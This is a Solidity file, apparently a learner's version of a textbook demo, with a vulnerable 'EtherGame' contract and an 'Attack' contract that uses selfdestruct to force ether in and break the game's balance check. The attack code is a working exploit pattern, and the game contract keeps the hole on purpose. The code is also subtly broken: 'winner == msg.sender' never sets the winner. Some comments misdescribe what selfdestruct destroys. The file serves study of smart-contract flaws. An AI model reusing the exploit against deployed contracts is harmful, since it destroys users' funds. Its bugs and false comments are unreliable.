pragma solidity ^0.8.13;

contract EtherGame{
    //a game of luck where 7 people deposite 1ether each to get a target of 7ether and the last person to deposite te 7th ether wins

    uint public targetAmount = 7 ether; //assign the target amount
    address public winner; //to hold the address of the 7th person that deposited the 7th ether(winner)

    function deposite() public payable{
        require(msg.value == 1 ether, "you can only send 1 Ether");

        uint balance = address(this).balance; //created a local variable called balance
        require(balance <= targetAmount, "Game over");

        if(balance == targetAmount){
            winner == msg.sender; //when the 7th person calls this function
        } 
    }
    function claimReward() public{ //to allow winner to claim the reward
        require(msg.sender == winner, "Not winner");

        (bool sent,) = msg.sender.call{value: address(this).balance}("");
        //to claim everything in the contract
        require(sent, "Failed to send Ether");

    }
}
contract Attack{ //using self destruct as a way of attacking
    //to force funds greater than the target into the contract
    EtherGame etherGame; //save the main contract into a new variable

    constructor(EtherGame _etherGame){//takes an imput, the address of the new variable
        etherGame = EtherGame(_etherGame);
    }
    function attack() public payable{
        //you can simply break the game by sending ether so that the game balance >= 7 ether

        address payable addr = payable(address(etherGame)); 
        //assign an address to the new variable
        //cast address to payable in other to receive money
        //can by-pass all the requirement
        
        selfdestruct(addr);
        //destroying the main smart contract after taking the total amount in it(i.e after being attacked)
    }//selfdestruct on a contract render it useless
}
